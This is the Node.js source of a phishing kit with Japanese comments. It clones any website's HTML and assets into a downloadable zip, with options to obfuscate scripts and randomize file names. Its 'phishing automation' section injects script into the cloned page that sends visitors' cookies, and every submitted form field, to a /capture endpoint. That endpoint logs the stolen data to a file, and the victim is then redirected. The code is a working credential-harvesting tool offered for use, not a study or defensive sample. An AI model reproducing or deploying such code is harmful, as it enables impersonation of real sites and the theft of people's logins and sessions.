
const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const archiver = require('archiver');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { minify: minifyHTML } = require('html-minifier-terser');
const CleanCSS = require('clean-css');
const UglifyJS = require('uglify-js');
const mime = require('mime-types');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// ============================================
// ユーティリティ関数
// ============================================
function minifyCSS(code) {
    try {
        return new CleanCSS({ level: 2 }).minify(code).styles;
    } catch(e) {
        return code;
    }
}

function minifyJS(code) {
    try {
        return UglifyJS.minify(code).code;
    } catch(e) {
        return code;
    }
}

function obfuscateJS(code) {
    try {
        return JavaScriptObfuscator.obfuscate(code, {
            compact: true,
            controlFlowFlattening: true,
            deadCodeInjection: true,
            stringArray: true,
            stringArrayThreshold: 0.75
        }).getObfuscatedCode();
    } catch(e) {
        return code;
    }
}

function randomName(ext) {
    return crypto.randomBytes(10).toString('hex') + '.' + ext;
}

function resolveURL(url, baseUrl) {
    try {
        return new URL(url, baseUrl).href;
    } catch(e) {
        return null;
    }
}

function getExtension(url, contentType) {
    const urlExt = path.extname(new URL(url, 'http://example.com').pathname).slice(1).toLowerCase();
    
    if (urlExt && urlExt.length <= 5) return urlExt;
    
    if (contentType) {
        const ext = mime.extension(contentType);
        if (ext) return ext;
    }
    
    return 'bin';
}

// ============================================
// リソース取得
// ============================================
async function fetchResource(url, baseUrl) {
    try {
        const fullUrl = new URL(url, baseUrl).href;
        
        const response = await axios.get(fullUrl, {
            responseType: 'arraybuffer',
            timeout: 30000,
            maxRedirects: 10,
            headers: {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Accept': '*/*',
                'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8',
                'Referer': baseUrl
            }
        });
        
        return {
            data: response.data,
            contentType: response.headers['content-type'],
            finalUrl: response.request.res.responseUrl || fullUrl
        };
    } catch(e) {
        return null;
    }
}

// ============================================
// CSS内のリソース抽出
// ============================================
async function extractCSSResources(cssCode, cssUrl, config, resources, resourceMap, resourceCount, maxResources) {
    const urlRegex = /url\(['"]?([^'")]+)['"]?\)/g;
    let match;
    let updatedCSS = cssCode;
    
    while ((match = urlRegex.exec(cssCode)) !== null) {
        if (resourceCount >= maxResources) break;
        
        const assetUrl = match[1];
        
        if (!assetUrl || assetUrl.startsWith('data:') || assetUrl.startsWith('#')) continue;
        
        const fullAssetUrl = resolveURL(assetUrl, cssUrl);
        if (!fullAssetUrl) continue;
        
        const content = await fetchResource(fullAssetUrl, cssUrl);
        if (content && content.data) {
            const ext = getExtension(fullAssetUrl, content.contentType);
            const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullAssetUrl).pathname) || randomName(ext);
            
            resources[filename] = content.data;
            resourceMap[fullAssetUrl] = filename;
            resourceMap[assetUrl] = filename;
            
            updatedCSS = updatedCSS.split(assetUrl).join(filename);
            
            resourceCount++;
        }
    }
    
    return { updatedCSS, resourceCount };
}

// ============================================
// HTML内のリソース抽出
// ============================================
async function extractHTMLResources($, html, url, config, resources, resourceMap, resourceCount, maxResources) {
    // CSS (link)
    if (!config.clone || config.clone.css !== false) {
        const cssLinks = [];
        $('link[rel="stylesheet"]').each((i, el) => {
            const href = $(el).attr('href');
            if (href && !href.startsWith('data:')) {
                cssLinks.push(href);
            }
        });
        
        for (const cssUrl of cssLinks) {
            if (resourceCount >= maxResources) break;
            
            const fullCssUrl = resolveURL(cssUrl, url);
            if (!fullCssUrl) continue;
            
            console.log(`Fetching CSS: ${fullCssUrl}`);
            
            const content = await fetchResource(fullCssUrl, url);
            if (content && content.data) {
                let cssCode = Buffer.from(content.data).toString('utf8');
                
                console.log(`CSS size: ${cssCode.length} bytes`);
                
                const result = await extractCSSResources(cssCode, fullCssUrl, config, resources, resourceMap, resourceCount, maxResources);
                cssCode = result.updatedCSS;
                resourceCount = result.resourceCount;
                
                if (config.output && config.output.minify) {
                    cssCode = minifyCSS(cssCode);
                }
                
                const filename = config.output && config.output.randomizeNames ? randomName('css') : path.basename(new URL(fullCssUrl).pathname) || randomName('css');
                resources[filename] = Buffer.from(cssCode);
                resourceMap[cssUrl] = filename;
                resourceMap[fullCssUrl] = filename;
                resourceCount++;
                
                console.log(`Added CSS: ${filename} (${cssCode.length} bytes)`);
            }
        }
    }
    
    // JavaScript
    if (!config.clone || config.clone.js !== false) {
        const jsFiles = [];
        $('script[src]').each((i, el) => {
            const src = $(el).attr('src');
            if (src && !src.startsWith('data:')) {
                jsFiles.push(src);
            }
        });
        
        for (const jsUrl of jsFiles) {
            if (resourceCount >= maxResources) break;
            
            const fullJsUrl = resolveURL(jsUrl, url);
            if (!fullJsUrl) continue;
            
            console.log(`Fetching JS: ${fullJsUrl}`);
            
            const content = await fetchResource(fullJsUrl, url);
            if (content && content.data) {
                let jsCode = Buffer.from(content.data).toString('utf8');
                
                console.log(`JS size: ${jsCode.length} bytes`);
                
                if (config.output && config.output.obfuscate) {
                    jsCode = obfuscateJS(jsCode);
                } else if (config.output && config.output.minify) {
                    jsCode = minifyJS(jsCode);
                }
                
                const filename = config.output && config.output.randomizeNames ? randomName('js') : path.basename(new URL(fullJsUrl).pathname) || randomName('js');
                resources[filename] = Buffer.from(jsCode);
                resourceMap[jsUrl] = filename;
                resourceMap[fullJsUrl] = filename;
                resourceCount++;
                
                console.log(`Added JS: ${filename} (${jsCode.length} bytes)`);
            }
        }
    }
    
    // 画像
    if (!config.clone || config.clone.images !== false) {
        const images = [];
        
        $('img').each((i, el) => {
            const src = $(el).attr('src');
            if (src && !src.startsWith('data:')) {
                images.push(src);
            }
        });
        
        $('img[srcset]').each((i, el) => {
            const srcset = $(el).attr('srcset');
            if (srcset) {
                const srcsetUrls = srcset.split(',').map(s => s.trim().split(' ')[0]);
                srcsetUrls.forEach(src => {
                    if (src && !src.startsWith('data:')) {
                        images.push(src);
                    }
                });
            }
        });
        
        $('[style*="background"]').each((i, el) => {
            const style = $(el).attr('style') || '';
            const bgRegex = /background(?:-image)?\s*:\s*url\(['"]?([^'")]+)['"]?\)/g;
            let match;
            while ((match = bgRegex.exec(style)) !== null) {
                if (match[1] && !match[1].startsWith('data:')) {
                    images.push(match[1]);
                }
            }
        });
        
        $('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').each((i, el) => {
            const href = $(el).attr('href');
            if (href && !href.startsWith('data:')) {
                images.push(href);
            }
        });
        
        for (const imgUrl of images) {
            if (resourceCount >= maxResources) break;
            
            const fullImgUrl = resolveURL(imgUrl, url);
            if (!fullImgUrl) continue;
            
            console.log(`Fetching image: ${fullImgUrl}`);
            
            const content = await fetchResource(fullImgUrl, url);
            if (content && content.data) {
                const ext = getExtension(fullImgUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullImgUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                resourceMap[imgUrl] = filename;
                resourceMap[fullImgUrl] = filename;
                resourceCount++;
                
                console.log(`Added image: ${filename} (${Buffer.byteLength(content.data)} bytes)`);
            }
        }
    }
    
    // フォント
    if (!config.clone || config.clone.fonts !== false) {
        const fonts = [];
        
        $('link[rel="preload"][as="font"]').each((i, el) => {
            const href = $(el).attr('href');
            if (href) fonts.push(href);
        });
        
        $('link[rel="preload"][type="font/woff2"]').each((i, el) => {
            const href = $(el).attr('href');
            if (href) fonts.push(href);
        });
        
        for (const fontUrl of fonts) {
            if (resourceCount >= maxResources) break;
            
            const fullFontUrl = resolveURL(fontUrl, url);
            if (!fullFontUrl) continue;
            
            const content = await fetchResource(fullFontUrl, url);
            if (content && content.data) {
                const ext = getExtension(fullFontUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullFontUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                resourceMap[fontUrl] = filename;
                resourceMap[fullFontUrl] = filename;
                resourceCount++;
            }
        }
    }
    
    // 動画・音声
    if (!config.clone || config.clone.videos !== false) {
        const media = [];
        
        $('video source, video[src], audio source, audio[src]').each((i, el) => {
            const src = $(el).attr('src');
            if (src && !src.startsWith('data:')) {
                media.push(src);
            }
        });
        
        for (const mediaUrl of media) {
            if (resourceCount >= maxResources) break;
            
            const fullMediaUrl = resolveURL(mediaUrl, url);
            if (!fullMediaUrl) continue;
            
            const content = await fetchResource(fullMediaUrl, url);
            if (content && content.data) {
                const ext = getExtension(fullMediaUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullMediaUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                resourceMap[mediaUrl] = filename;
                resourceMap[fullMediaUrl] = filename;
                resourceCount++;
            }
        }
    }
    
    // HTML内のパス置換
    let updatedHTML = html;
    for (const [originalUrl, newFilename] of Object.entries(resourceMap)) {
        const escapedUrl = originalUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        updatedHTML = updatedHTML.split(originalUrl).join(newFilename);
    }
    
    return { updatedHTML, resourceCount };
}

// ============================================
// メインクローン関数
// ============================================
async function cloneSiteDeep(url, config) {
    console.log(`Starting clone: ${url}`);
    
    const response = await axios.get(url, {
        timeout: 30000,
        maxRedirects: 10,
        headers: {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8'
        }
    });
    
    let html = response.data;
    console.log(`HTML size: ${html.length} bytes`);
    
    const $ = cheerio.load(html);
    const resources = {};
    const resourceMap = {};
    let resourceCount = 0;
    
    const maxResources = (config.clone && config.clone.maxResources) || 500;
    
    const result = await extractHTMLResources($, html, url, config, resources, resourceMap, resourceCount, maxResources);
    html = result.updatedHTML;
    resourceCount = result.resourceCount;
    
    console.log(`Total resources: ${resourceCount}`);
    console.log(`Resource keys: ${Object.keys(resources).join(', ')}`);
    
    // フィッシング自動化
    if (config.phishing && config.phishing.enabled) {
        let phishingScript = '<script>';
        
        if (config.phishing.captureCookies) {
            phishingScript += `
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'cookies',
                    url: '${url}',
                    data: document.cookie,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now()
                })
            });
            `;
        }
        
        if (config.phishing.captureForm) {
            phishingScript += `
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelectorAll('form').forEach(form => {
                    form.addEventListener('submit', (e) => {
                        e.preventDefault();
                        
                        const formData = {};
                        form.querySelectorAll('input, select, textarea').forEach(input => {
                            if (input.name) {
                                formData[input.name] = input.value;
                            }
                        });
                        
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'form',
                                url: '${url}',
                                data: formData,
                                cookies: document.cookie,
                                userAgent: navigator.userAgent,
                                timestamp: Date.now()
                            })
                        }).then(() => {
                            ${config.phishing.redirectUrl ? `window.location.href = '${config.phishing.redirectUrl}';` : ''}
                        });
                    });
                });
            });
            `;
        }
        
        phishingScript += '</script>';
        html = html.replace('</body>', phishingScript + '</body>');
    }
    
    // HTML minify
    if (config.output && config.output.minify) {
        html = await minifyHTML(html, {
            collapseWhitespace: true,
            removeComments: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true
        });
    }
    
    resources['index.html'] = Buffer.from(html);
    
    return resources;
}

// ============================================
// キャプチャエンドポイント
// ============================================
app.post('/capture', (req, res) => {
    const data = req.body;
    const log = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
    fs.appendFileSync('captured.log', log);
    res.json({ success: true });
});

// ============================================
// クローンエンドポイント
// ============================================
app.post('/clone', async (req, res) => {
    const config = req.body;
    
    try {
        const resources = await cloneSiteDeep(config.url, config);
        
        const siteName = new URL(config.url).hostname.replace(/\./g, '-');
        
        const archive = archiver('zip', { zlib: { level: 9 } });
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=${siteName}_clone_${Date.now()}.zip`);
        
        archive.pipe(res);
        
        Object.entries(resources).forEach(([filename, content]) => {
            const buffer = Buffer.isBuffer(content) ? content : Buffer.from(content);
            console.log(`ZIP: ${siteName}/${filename} (${buffer.length} bytes)`);
            archive.append(buffer, { name: `${siteName}/${filename}` });
        });
        
        archive.finalize();
        
        console.log(`Clone complete: ${Object.keys(resources).length} files`);
    } catch(e) {
        console.error('Clone error:', e.message);
        console.error(e.stack);
        res.status(500).json({ error: e.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Clone server running on ${PORT}`);
});
